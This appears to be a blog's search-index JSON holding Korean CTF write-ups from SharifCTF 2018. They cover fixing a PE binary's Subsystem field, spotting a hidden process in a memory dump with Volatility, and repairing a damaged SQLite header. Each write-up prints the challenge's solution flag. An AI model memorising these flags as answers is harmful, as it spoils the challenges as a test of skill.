것을 확인할 수 있다. 정상적인 PE binary와 비교했을 때, 차이점을 살펴보다. <code class=\"highlighter-rouge\">Subsystem</code> 항목이 Native 로 설정되어 있는 것을 확인할 수 있었는데 관련 정보를 찾아보니 보통, <code class=\"highlighter-rouge\">2</code>,<code class=\"highlighter-rouge\">3</code> 으로 지정되어 있는 것을 확인.\n<img src=\"/images/2018-02-16-Sharif-CTF-RunMe-50/error.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] execution error</i></p>\n\n<div class=\"highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>NATIVE : 1  --&gt;  Doesn't require a subsystem\nWindows GUI : 2 --&gt; Runs in the Windows GUI subsystem\nWINDOWS CUI : 3 --&gt; Runs in console subsystem\n</code></pre></div></div>\n\n<p>아래와 같이, <code class=\"highlighter-rouge\">Subsystem</code> offset을 수정해주었다. 그 결과, 실행에 성공했다는 string 과 함께, file의 hash 값이 flag임을 명시하고 있다.\n<img src=\"/images/2018-02-16-Sharif-CTF-RunMe-50/fix.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] fix subsystem</i></p>\n\n<pre><code class=\"language-cmd\">C:\\Users\\jsh05042\\Desktop\\sharif\\reversing&gt;python\nPython 2.7.6 (default, Nov 10 2013, 19:24:18) [MSC v.1500 32 bit (Intel)] on win32\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; import hashlib\n&gt;&gt;&gt; f = open('RunMe2.exe','rb')\n&gt;&gt;&gt; hashlib.md5(f.read()).hexdigest()\n'3de0531cb6069ff18543fe767e384b83'\n&gt;&gt;&gt;\n</code></pre>\n\n<p align=\"right\"><strong>SharifCTF{3de0531cb6069ff18543fe767e384b83}</strong></p>\n\n    <article>\n    <div class=\"post-more\">\n      \n      <a href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-RunMe-50/#disqus_thread\"> <i class=\"fa fa-comments\" aria-hidden=\"true\"></i>Comment</a>&nbsp;\n      \n      <a href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-RunMe-50/\"><i class=\"fa fa-plus-circle\" aria-hidden=\"true\"></i>Read more</a>\n    </div>\n  </div>\n  \n  <div class=\"post\">\n    <h1 class=\"post-title\">\n      <a href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-Hidden-100/\">\n        [2018_Sharif_CTF] Hidden(100)\n      </a>\n    </h1>\n\n    <span class=\"post-date\">16 Feb 2018</span>\n     |\n    \n    <a href=\"/blog/tags/#reversing\" class=\"post-tag\">Reversing</a>\n    \n    <a href=\"/blog/tags/#string\" class=\"post-tag\">string</a>\n    \n    \n\n    <article>\n      <h2 id=\"exercise\">Exercise</h2>\n\n<blockquote>\n  <p>Find the hidden process.</p>\n</blockquote>\n\n<blockquote>\n  <p>The flag is SharifCTF{MD5(Process id)}.</p>\n</blockquote>\n\n<p><img src=\"/images/2018-02-16-Sharif-CTF-Hidden-100/exercise.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] exercise</p>\n\n<h2 id=\"solution\">Solution</h2>\n\n<p>숨겨진 프로세스를 찾아내는 문제. <code class=\"highlighter-rouge\">process</code> -&gt; <code class=\"highlighter-rouge\">Memory?</code> 직감에 압축을 풀고, binary를 살펴보면, memory dump 파일임을 알 수 있다. volatility를 이용해 imageinfo 결과 xp memory dump 파일임을 확인.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/100_ Hidden\nvol <span class=\"nt\">-f</span> ./dump imageinfo\nVolatility Foundation Volatility Framework 2.6\nINFO    : volatility.debug    : Determining profile based on KDBG search...\nWARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present <span class=\"k\">in </span>vtypes\nWARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present <span class=\"k\">in </span>vtypes\nWARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present <span class=\"k\">in </span>vtypes\n          Suggested Profile<span class=\"o\">(</span>s<span class=\"o\">)</span> : WinXPSP2x86, WinXPSP3x86 <span class=\"o\">(</span>Instantiated with WinXPSP2x86<span class=\"o\">)</span>\n                     AS Layer1 : IA32PagedMemoryPae <span class=\"o\">(</span>Kernel AS<span class=\"o\">)</span>\n                     AS Layer2 : FileAddressSpace <span class=\"o\">(</span>/Users/Mac/Desktop/CTF/2018_Sharif_CTF/Forensic/100_ Hidden/dump<span class=\"o\">)</span>\n                      PAE <span class=\"nb\">type</span> : PAE\n                           DTB : 0x359000L\n                          KDBG : 0x80545c60L\n          Number of Processors : 1\n     Image Type <span class=\"o\">(</span>Service Pack<span class=\"o\">)</span> : 3\n                KPCR <span class=\"k\">for </span>CPU 0 : 0xffdff000L\n             KUSER_SHARED_DATA : 0xffdf0000L\n           Image date and <span class=\"nb\">time</span> : 2018-01-28 17:35:20 UTC+0000\n     Image <span class=\"nb\">local </span>date and <span class=\"nb\">time</span> : 2018-01-28 21:05:20 +0330\n</code></pre></div></div>\n\n<p>process 확인을 위해서, <code class=\"highlighter-rouge\">pslist</code>, <code class=\"highlighter-rouge\">psscan</code> 두 명령어를 수행하고, psscan 에서 추가적으로 식별되는 항목을 확인할 수 있다.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/100_ Hidden\n vol <span class=\"nt\">-f</span> ./dump <span class=\"nv\">profile</span><span class=\"o\">=</span>WinXPSP2x86 pslist\nVolatility Foundation Volatility Framework 2.6\nOffset<span class=\"o\">(</span>V<span class=\"o\">)</span>  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit\n<span class=\"nt\">----------</span> <span class=\"nt\">--------------------</span> <span class=\"nt\">------</span> <span class=\"nt\">------</span> <span class=\"nt\">------</span> <span class=\"nt\">--------</span> <span class=\"nt\">------</span> <span class=\"nt\">------</span> <span class=\"nt\">------------------------------</span> <span class=\"nt\">------------------------------</span>\n0x81242a00 System                    4      0     57      263 <span class=\"nt\">------</span>      0\n0xff391900 smss.exe                548      4      3       19 <span class=\"nt\">------</span>      0 2018-01-28 16:59:16 UTC+0000\n0xff36bda0 csrss.exe               620    548     12      305      0      0 2018-01-28 16:59:19 UTC+0000\n0xff39f608 winlogon.exe            644    548     19      537      0      0 2018-01-28 16:59:20 UTC+0000\n0xff391488 services.exe            688    644     16      353      0      0 2018-01-28 16:59:24 UTC+0000\n0xff390410 lsass.exe               700    644     20      349      0      0 2018-01-28 16:59:25 UTC+0000\n0xff378798 vmacthlp.exe            856    688      1       25      0      0 2018-01-28 16:59:34 UTC+0000\n0xff3a59c0 svchost.exe             900    688     17      211      0      0 2018-01-28 16:59:39 UTC+0000\n0xff3bc378 svchost.exe             988    688     11      235      0      0 2018-01-28 16:59:47 UTC+0000\n0xff3cb6e0 svchost.exe            1024    688     54     1107      0      0 2018-01-28 16:59:51 UTC+0000\n0xff2077a8 svchost.exe            1188    688      4       57      0      0 2018-01-28 16:59:53 UTC+0000\n0xff3a7878 svchost.exe            1236    688     10      167      0      0 2018-01-28 16:59:56 UTC+0000\n0xff1bbcf0 spoolsv.exe            1508    688     11      140      0      0 2018-01-28 17:00:19 UTC+0000\n0xff1b1020 explorer.exe           1576   1444     12      404      0      0 2018-01-28 17:00:24 UTC+0000\n0xff1aa9f0 svchost.exe            1604    688      4      105      0      0 2018-01-28 17:00:25 UTC+0000\n0xff197b20 svchost.exe            1692    688      3       94      0      0 2018-01-28 17:00:31 UTC+0000\n0x811244c0 rundll32.exe            396   1576      4       70      0      0 2018-01-28 17:02:48 UTC+0000\n0xff1c30e8 wscntfy.exe             920   1024      1       31      0      0 2018-01-28 17:05:09 UTC+0000\n</code></pre></div></div>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/100_ Hidden\n vol <span class=\"nt\">-f</span> ./dump <span class=\"nv\">profile</span><span class=\"o\">=</span>WinXPSP2x86 psscan\nVolatility Foundation Volatility Framework 2.6\nOffset<span class=\"o\">(</span>P<span class=\"o\">)</span>          Name                PID   PPID PDB        Time created                   Time exited\n<span class=\"nt\">------------------</span> <span class=\"nt\">----------------</span> <span class=\"nt\">------</span> <span class=\"nt\">------</span> <span class=\"nt\">----------</span> <span class=\"nt\">------------------------------</span> <span class=\"nt\">------------------------------</span>\n0x000000000096c0e8 wscntfy.exe         920   1024 0x007002c0 2018-01-28 17:05:09 UTC+0000\n0x00000000010eb4c0 rundll32.exe        396   1576 0x007001a0 2018-01-28 17:02:48 UTC+0000\n0x0000000001209a00 System                4      0 0x00359000\n0x0000000001bbd488 services.exe        688    644 0x00700080 2018-01-28 16:59:24 UTC+0000\n0x0000000001bbd900 smss.exe            548      4 0x00700020 2018-01-28 16:59:16 UTC+0000\n0x0000000001c279c0 svchost.exe         900    688 0x00700100 2018-01-28 16:59:39 UTC+0000\n0x0000000001c58798 vmacthlp.exe        856    688 0x007000c0 2018-01-28 16:59:34 UTC+0000\n0x0000000001de4878 svchost.exe        1236    688 0x00700180 2018-01-28 16:59:56 UTC+0000\n0x0000000001e64350 vmtoolsd.exe        404   1576 0x00700260 2018-01-28 17:02:50 UTC+0000\n0x0000000001e6d608 winlogon.exe        644    548 0x00700060 2018-01-28 16:59:20 UTC+0000\n0x0000000001ebe168 cmd.exe            1704   1576 0x007002a0 2018-01-28 17:30:47 UTC+0000   2018-01-28 17:34:00 UTC+0000\n0x0000000001ecd378 svchost.exe         988    688 0x00700120 2018-01-28 16:59:47 UTC+0000\n0x0000000001fbd6e0 svchost.exe        1024    688 0x00700140 2018-01-28 16:59:51 UTC+0000\n0x0000000001fbe410 lsass.exe           700    644 0x007000a0 2018-01-28 16:59:25 UTC+0000\n0x00000000021a7da0 csrss.exe           620    548 0x00700040 2018-01-28 16:59:19 UTC+0000\n0x00000000025b7020 explorer.exe       1576   1444 0x007001e0 2018-01-28 17:00:24 UTC+0000\n0x0000000002dbb448 wmiprvse.exe        908    900 0x00700240 2018-01-28 17:32:51 UTC+0000   2018-01-28 17:34:22 UTC+0000\n0x0000000002e7eb20 svchost.exe        1692    688 0x00700220 2018-01-28 17:00:31 UTC+0000\n0x000000000308d9f0 svchost.exe        1604    688 0x00700200 2018-01-28 17:00:25 UTC+0000\n0x00000000031b1cf0 spoolsv.exe        1508    688 0x007001c0 2018-01-28 17:00:19 UTC+0000\n0x00000000039347a8 svchost.exe        1188    688 0x00700160 2018-01-28 16:59:53 UTC+0000\n</code></pre></div></div>\n\n<p>두 결과의 차이점 항목을 확인해보면, 아래와 같이 3개의 항목을 식별할 수 있다. <code class=\"highlighter-rouge\">cmd.exe</code>, <code class=\"highlighter-rouge\">wmiprvse.exe</code> 두 항목은 process 가 종료되어 pslist에서 식별되지 않았음을 알 수 있지만 <code class=\"highlighter-rouge\">vmtoolsd.exe</code> 항목은 종료된 기록이 없음과 동시에 pslist에서 식별되지 않았으므로 해당 항목이 은닉된 프로세스임을 알 수 있다. (자세히 보면, vmtools와 유사한 <code class=\"highlighter-rouge\">vmtoolsd</code> 파일명을 사용하고 있다.)</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>0x0000000001ebe168 cmd.exe            1704   1576 0x007002a0 2018-01-28 17:30:47 UTC+0000   2018-01-28 17:34:00 UTC+0000\n0x0000000002dbb448 wmiprvse.exe        908    900 0x00700240 2018-01-28 17:32:51 UTC+0000   2018-01-28 17:34:22 UTC+0000\n0x0000000001e64350 vmtoolsd.exe        404   1576 0x00700260 2018-01-28 17:02:50 UTC+0000\n</code></pre></div></div>\n\n<p>md5 값이 flag 이므로 변환해주도록 한다.</p>\n<div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> <span class=\"n\">jsh05042</span><span class=\"nd\">@Macs</span><span class=\"o\">-</span><span class=\"n\">MacBook</span><span class=\"o\">-</span><span class=\"n\">Pro</span> <span class=\"err\"></span> <span class=\"o\">~/</span><span class=\"n\">Desktop</span><span class=\"o\">/</span><span class=\"n\">CTF</span><span class=\"o\">/</span><span class=\"mi\">2018</span><span class=\"n\">_Sharif_CTF</span><span class=\"o\">/</span><span class=\"n\">Forensic</span><span class=\"o\">/</span><span class=\"mi\">100</span><span class=\"n\">_</span> <span class=\"n\">Hidden</span><span class=\"err\"></span>\n<span class=\"err\"></span> <span class=\"n\">python</span>\n<span class=\"n\">Python</span> <span class=\"mf\">2.7</span><span class=\"o\">.</span><span class=\"mi\">10</span> <span class=\"p\">(</span><span class=\"n\">default</span><span class=\"p\">,</span> <span class=\"n\">Feb</span>  <span class=\"mi\">7</span> <span class=\"mi\">2017</span><span class=\"p\">,</span> <span class=\"mo\">00</span><span class=\"p\">:</span><span class=\"mi\">08</span><span class=\"p\">:</span><span class=\"mi\">15</span><span class=\"p\">)</span>\n<span class=\"p\">[</span><span class=\"n\">GCC</span> <span class=\"mf\">4.2</span><span class=\"o\">.</span><span class=\"mi\">1</span> <span class=\"n\">Compatible</span> <span class=\"n\">Apple</span> <span class=\"n\">LLVM</span> <span class=\"mf\">8.0</span><span class=\"o\">.</span><span class=\"mi\">0</span> <span class=\"p\">(</span><span class=\"n\">clang</span><span class=\"o\">-</span><span class=\"mf\">800.0</span><span class=\"o\">.</span><span class=\"mi\">34</span><span class=\"p\">)]</span> <span class=\"n\">on</span> <span class=\"n\">darwin</span>\n<span class=\"n\">Type</span> <span class=\"s\">\"help\"</span><span class=\"p\">,</span> <span class=\"s\">\"copyright\"</span><span class=\"p\">,</span> <span class=\"s\">\"credits\"</span> <span class=\"ow\">or</span> <span class=\"s\">\"license\"</span> <span class=\"k\">for</span> <span class=\"n\">more</span> <span class=\"n\">information</span><span class=\"o\">.</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"kn\">import</span> <span class=\"nn\">hashlib</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">hashlib</span><span class=\"o\">.</span><span class=\"n\">md5</span><span class=\"p\">(</span><span class=\"s\">'404'</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">hexdigest</span><span class=\"p\">()</span>\n<span class=\"s\">'4f4adcbf8c6f66dcfc8a3282ac2bf10a'</span>\n<span class=\"o\">&gt;&gt;&gt;</span>\n</code></pre></div></div>\n\n<p align=\"right\"><strong>SharifCTF{4f4adcbf8c6f66dcfc8a3282ac2bf10a}</strong></p>\n\n    <article>\n    <div class=\"post-more\">\n      \n      <a href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-Hidden-100/#disqus_thread\"> <i class=\"fa fa-comments\" aria-hidden=\"true\"></i>Comment</a>&nbsp;\n      \n      <a href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-Hidden-100/\"><i class=\"fa fa-plus-circle\" aria-hidden=\"true\"></i>Read more</a>\n    </div>\n  </div>\n  \n  <div class=\"post\">\n    <h1 class=\"post-title\">\n      <a href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-Crashed-DB-50/\">\n        [2018_Sharif_CTF] Crashed DB(50)\n      </a>\n    </h1>\n\n    <span class=\"post-date\">16 Feb 2018</span>\n     |\n    \n    <a href=\"/blog/tags/#forensic\" class=\"post-tag\">Forensic</a>\n    \n    <a href=\"/blog/tags/#sqlite3\" class=\"post-tag\">sqlite3</a>\n    \n    <a href=\"/blog/tags/#db\" class=\"post-tag\">db</a>\n    \n    \n\n    <article>\n      <h2 id=\"exercise\">Exercise</h2>\n\n<blockquote>\n  <p>We lost some data when we were delivering our DB.\nCan you recover it??\nHint: SQLite</p>\n</blockquote>\n\n<p><img src=\"/images/2018-02-16-Sharif-CTF-Crashed-DB-50/exercise.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] exercise</p>\n\n<h2 id=\"solution\">Solution</h2>\n\n<p>Forensic 첫번째 문제, DB 전송 과정에서 일부 데이터를 손실했으며, 이를 복구할 수 있는지 묻고 있다. SQLite 가 hint로 주어진 것을 보아, sqlite db 관련 문제임을 확인.</p>\n\n<p>sqlite3 를 통해, 해당 binary를 읽어보면, db 정보가 전혀 식별되지 않는 것을 확인할 수 있으며 table 조회 시, error를 볼 수 있다.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/50_Crashed DB\n sqlite3 ./db0.db\nSQLite version 3.16.0 2016-11-04 19:09:39\nEnter <span class=\"s2\">\".help\"</span> <span class=\"k\">for </span>usage hints.\nsqlite&gt; .dbinfo\ndatabase page size:  0\nwrite format:        0\n<span class=\"nb\">read </span>format:         0\nreserved bytes:      0\nfile change counter: 0\ndatabase page count: 0\nfreelist page count: 0\nschema cookie:       0\nschema format:       0\ndefault cache size:  0\nautovacuum top root: 0\nincremental vacuum:  0\ntext encoding:       0\nuser version:        0\napplication id:      0\nsoftware version:    0\nnumber of tables:    0\nnumber of indexes:   0\nnumber of triggers:  0\nnumber of views:     0\nschema size:         0\n</code></pre></div></div>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>sqlite&gt; .table\nError: file is encrypted or is not a database\n</code></pre></div></div>\n\n<p>binary 확인 시, signature를 포함한 header 정보가 날아가 있는 것을 확인할 수 있다.\n<img src=\"/images/2018-02-16-Sharif-CTF-Crashed-DB-50/init.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] Header information</i></p>\n\n<p>적당한, sqlite db 파일을 하나 만들고 <code class=\"highlighter-rouge\">db0.db</code>의 0번째 offset 인 0x0D 로 구분되는 지점까지의 header offset을 가져다 넣어준다.\n<img src=\"/images/2018-02-16-Sharif-CTF-Crashed-DB-50/tmp_header.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] tmp Header</i></p>\n\n<p><img src=\"/images/2018-02-16-Sharif-CTF-Crashed-DB-50/fix_header.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] fixed Header</i></p>\n\n<p>remake 한 db 파일의 정보를 확인하여, table 정보를 식별하려 하면, 아래와 같은 error message를 확인할 수 있다.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/50_Crashed DB\n sqlite3 ./remake_db0.db\nSQLite version 3.16.0 2016-11-04 19:09:39\nEnter <span class=\"s2\">\".help\"</span> <span class=\"k\">for </span>usage hints.\nsqlite&gt; .dbinfo\ndatabase page size:  1024\nwrite format:        1\n<span class=\"nb\">read </span>format:         1\nreserved bytes:      0\nfile change counter: 1\ndatabase page count: 2\nfreelist page count: 0\nschema cookie:       1\nschema format:       4\ndefault cache size:  0\nautovacuum top root: 0\nincremental vacuum:  0\ntext encoding:       1 <span class=\"o\">(</span>utf8<span class=\"o\">)</span>\nuser version:        0\napplication id:      0\nsoftware version:    3008004\nnumber of tables:    0\nnumber of indexes:   0\nnumber of triggers:  0\nnumber of views:     0\nschema size:         0\n\nsqlite&gt; .table\nError: database disk image is malformed\n</code></pre></div></div>\n\n<p>Error 정보를 확인해보면, page 와 관련이 있었다. 주어진 db 의 크기는 8kb size를 가진다. 아래와 같이 page의 크기를 0x1000 (4096) 으로 명시하고, 하나의 page 크기가 0x1000일 때, 해당 db는 8kb 이므로 2 page로 구성된다. 따라서 offset을 0x02로 수정한다.\n<img src=\"/images/2018-02-16-Sharif-CTF-Crashed-DB-50/fixed.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] fixed Header Offset</i></p>\n\n<p>이후, table과 table schema를 정상적으로 식별할 수 있었다.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>sqlite&gt; .schema\nCREATE TABLE tbl <span class=\"o\">(</span>Glaf varchar<span class=\"o\">(</span>15<span class=\"o\">)</span>, Flag varchar<span class=\"o\">(</span>1<span class=\"o\">)</span>, Lfag varchar<span class=\"o\">(</span>15<span class=\"o\">))</span><span class=\"p\">;</span>\n\nsqlite&gt; .table\ntbl\n</code></pre></div></div>\n\n<p><code class=\"highlighter-rouge\">tbl</code>이라는 table 내에서 <code class=\"highlighter-rouge\">Flag</code>라는 column을 하나 확인할 수 있는데 해당  정보를 출력하면 flag를 확인할 수 있다.</p>\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>✘ jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/50_Crashed DB\n sqlite3 ./remake_db0.db\nSQLite version 3.16.0 2016-11-04 19:09:39\nEnter <span class=\"s2\">\".help\"</span> <span class=\"k\">for </span>usage hints.\nsqlite&gt; <span class=\"k\">select </span>Flag from tbl<span class=\"p\">;</span>\nS\nh\na\nr\ni\nf\nC\nT\nF\n<span class=\"o\">{</span>\n7\nd\n9\ne\nd\n4\na\n5\n8\n6\n7\nf\n6\nb\nd\n3\n7\n6\n9\n2\n8\na\n3\ne\nd\n7\n8\n3\n7\na\n0\n7\n<span class=\"o\">}</span>\nsqlite&gt;\n</code></pre></div></div>\n\n<p align=\"right\"><strong>SharifCTF{7d9ed4a5867f6bd376928a3ed7837a07}</strong></p>\n\n    <article>\n    <div class=\"post-more\">\n      \n      <a href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-Crashed-DB-50/#disqus_thread\"> <i class=\"fa fa-comments\" aria-hidden=\"true\"></i>Comment</a>&nbsp;\n      \n      <a href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-Crashed-DB-50/\"><i class=\"fa fa-plus-circle\" aria-hidden=\"true\"></i>Read more</a>\n    </div>\n  </div>\n  \n</div>\n\n<div class=\"pagination\">\n  \n    <a class=\"pagination-item older\" href=\"/blog/page2\">Older</a>\n  \n  \n    <span class=\"pagination-item newer\">Newer</span>\n  \n</div>\n"
     
   } ,
  
   {
     
   } ,
  
   {
     
        "title"    : "Search",
        "category" : "",
        "tags"     : "",
        "url"      : "/search/",
        "date"     : "",
        "content"  : "<div id=\"results\">\n  <h1><!-- `key` listing for `value` --></h1>\n\n  <ul class=\"results\">\n    <!-- results lists -->\n  </ul>\n</div>\n\n<div id=\"search-container-google\">\n  <script>\n    (function() {\n      var cx = '015731003607597102937:cmvfrjrcoq0';\n      var gcse = document.createElement('script');\n      gcse.type = 'text/javascript';\n      gcse.async = true;\n      gcse.src = 'https://cse.google.com/cse.js?cx=' + cx;\n      var s = document.getElementsByTagName('script')[0];\n      s.parentNode.insertBefore(gcse, s);\n    })();\n  </script>\n  <gcse:search></gcse:search>\n</div>\n\n<!-- Html Elements for Search -->\n<!-- <div id=\"search-container\">\n<input type=\"text\" id=\"search-input\" placeholder=\"검색어를 입력하세요.\">\n<ul id=\"results-container\"></ul>\n</div> -->\n<!-- tag list -->\n<!-- <hr/>\n<div class=\"tags-expo-list\">\n  \n  <a href=\"https://wayhome25.github.io/blog/tags/#life\" class=\"post-tag\">life</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#Forensic\" class=\"post-tag\">Forensic</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#JTAG\" class=\"post-tag\">JTAG</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#SHA CTF\" class=\"post-tag\">SHA CTF</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#Writeup\" class=\"post-tag\">Writeup</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#etc\" class=\"post-tag\">etc</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#tensorflow\" class=\"post-tag\">tensorflow</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#error\" class=\"post-tag\">error</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#ctf\" class=\"post-tag\">ctf</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#MISC\" class=\"post-tag\">MISC</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#xor\" class=\"post-tag\">xor</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#Reversing\" class=\"post-tag\">Reversing</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#haskell\" class=\"post-tag\">haskell</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#z3\" class=\"post-tag\">z3</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#angr\" class=\"post-tag\">angr</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#android\" class=\"post-tag\">android</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#apk\" class=\"post-tag\">apk</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#javascript\" class=\"post-tag\">javascript</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#steganography\" class=\"post-tag\">steganography</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#memory\" class=\"post-tag\">memory</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#spammer\" class=\"post-tag\">spammer</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#Qr\" class=\"post-tag\">Qr</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#mp3\" class=\"post-tag\">mp3</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#deepsound\" class=\"post-tag\">deepsound</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#string\" class=\"post-tag\">string</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#sqlite3\" class=\"post-tag\">sqlite3</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#db\" class=\"post-tag\">db</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#ducky\" class=\"post-tag\">ducky</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n  <a href=\"https://wayhome25.github.io/blog/tags/#Network\" class=\"post-tag\">Network</a> -->\n\n  <!-- blog/tags/#python -->\n  <!-- \n</div> -->\n\n\n<!-- Script pointing to jekyll-search.js -->\n<script src=\"/dest/jekyll-search.js\" type=\"text/javascript\"></script>\n\n\n<script type=\"text/javascript\">\n      SimpleJekyllSearch({\n        searchInput: document.getElementById('search-input'),\n        resultsContainer: document.getElementById('results-container'),\n        json: '/search2.json',\n        searchResultTemplate: '<li><a href=\"{url}\" title=\"{desc}\">{title}</a></li>',\n        noResultsText: 'No results found',\n        limit: 10,\n        fuzzy: true,\n        exclude: ['Welcome']\n      })\n</script>\n"
     
   } ,
  
   {
     
   } ,
  
   {
     
   } ,
  
   {
     
        "title"    : "Tags",
        "category" : "",
        "tags"     : "",
        "url"      : "/blog/tags/",
        "date"     : "",
        "content"  : "<div class=\"tags-expo\">\n  <div class=\"tags-expo-list\">\n    {% for tag in site.tags %}\n    <a href=\"#{{ tag[0] | slugify }}\" class=\"post-tag\">{{ tag[0] }}</a>\n    {% endfor %}\n  </div>\n  <hr/>\n  <div class=\"tags-expo-section\">\n    {% for tag in site.tags %}\n    <h2 id=\"{{ tag[0] | slugify }}\">{{ tag[0] }}</h2>\n    <ul class=\"tags-expo-posts\">\n      {% for post in tag[1] %}\n        <a class=\"post-title\" href=\"{{ site.baseurl }}{{ post.url }}\">\n      <li>\n        {{ post.title }}\n      <small class=\"post-date\">{{ post.date | date_to_string }}</small>\n      </li>\n      </a>\n      {% endfor %}\n    </ul>\n    {% endfor %}\n  </div>\n</div>\n"
     
   } ,
  
   {
     
        "title"    : "Blog",
        "category" : "",
        "tags"     : "",
        "url"      : "/blog/page2/",
        "date"     : "",
